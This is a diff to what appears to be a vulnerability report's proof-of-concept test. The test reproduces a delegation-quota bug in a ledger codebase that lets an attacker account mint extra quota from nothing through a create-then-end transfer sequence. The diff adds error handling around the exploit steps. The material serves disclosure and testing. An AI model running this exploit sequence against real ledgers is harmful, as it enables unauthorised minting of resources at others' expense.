@@ -20,6 +20,8 @@ Impact: The attacker mints "ghost quotas" out of thin air (Quota_{final} = Quota
 PoC (State Deviation)
 
 #include <dlt_core/testing/env.h>
+#include <stdexcept>
+#include <iostream>
 using namespace dlt::test;
 
 class del_aragui99_test : public test_suite {
@@ -30,19 +32,42 @@ public:
         env.fund(10000, spn, atk);
 
         // setup initial delegation
-        env(json{{"TransactionType", "DelegationSet"}, {"Account", spn.human()}, {"Delegatee", atk.human()}, {"ReserveCount", 1}});
-        std::cout << "\n[*] aragui99 - Init Quota: " << env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount) << "\n";
+        auto tx_result = env(json{{"TransactionType", "DelegationSet"}, {"Account", spn.human()}, {"Delegatee", atk.human()}, {"ReserveCount", 1}});
+        if (!tx_result) {
+            throw std::runtime_error("DelegationSet transaction failed: " + tx_result.error_message());
+        }
+
+        auto le_init = env.le(keylet::delegation(spn, atk));
+        if (!le_init) {
+            throw std::runtime_error("Delegation ledger entry not found after DelegationSet");
+        }
+        std::cout << "\n[*] aragui99 - Init Quota: " << le_init->getFieldU32(sfReserveCount) << "\n";
 
         auto target = keylet::line(atk, spn);
 
         // trigger bypass on creation
-        env(json{{"TransactionType", "DelegationTransfer"}, {"Account", atk.human()}, {"ObjectID", strHex(target)}, {"Flags", FLAG_DELEGATE_CREATE}}, with_signature(spn));
-        std::cout << "[*] aragui99 - Quota after bypass: " << env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount) << "\n";
+        tx_result = env(json{{"TransactionType", "DelegationTransfer"}, {"Account", atk.human()}, {"ObjectID", strHex(target)}, {"Flags", FLAG_DELEGATE_CREATE}}, with_signature(spn));
+        if (!tx_result) {
+            throw std::runtime_error("DelegationTransfer (CREATE) failed: " + tx_result.error_message());
+        }
+
+        auto le_bypass = env.le(keylet::delegation(spn, atk));
+        if (!le_bypass) {
+            throw std::runtime_error("Delegation ledger entry not found after bypass creation");
+        }
+        std::cout << "[*] aragui99 - Quota after bypass: " << le_bypass->getFieldU32(sfReserveCount) << "\n";
 
         // trigger blind refund
-        env(json{{"TransactionType", "DelegationTransfer"}, {"Account", atk.human()}, {"ObjectID", strHex(target)}, {"Flags", FLAG_DELEGATE_END}});
+        tx_result = env(json{{"TransactionType", "DelegationTransfer"}, {"Account", atk.human()}, {"ObjectID", strHex(target)}, {"Flags", FLAG_DELEGATE_END}});
+        if (!tx_result) {
+            throw std::runtime_error("DelegationTransfer (END) failed: " + tx_result.error_message());
+        }
         
-        auto final_q = env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount);
+        auto le_final = env.le(keylet::delegation(spn, atk));
+        if (!le_final) {
+            throw std::runtime_error("Delegation ledger entry not found after termination");
+        }
+        auto final_q = le_final->getFieldU32(sfReserveCount);
         std::cout << "[!] aragui99 - Final Quota (MINTED): " << final_q << "\n\n";
 
         assert(final_q == 2); // boom. minted from thin air.
@@ -50,8 +75,13 @@ public:
 };
 
 int main() { 
-    del_aragui99_test t; 
-    t.run(); 
+    try {
+        del_aragui99_test t; 
+        t.run();
+    } catch (const std::exception& e) {
+        std::cerr << "[FATAL] Test aborted: " << e.what() << "\n";
+        return 1;
+    }
     return 0; 
 }
 
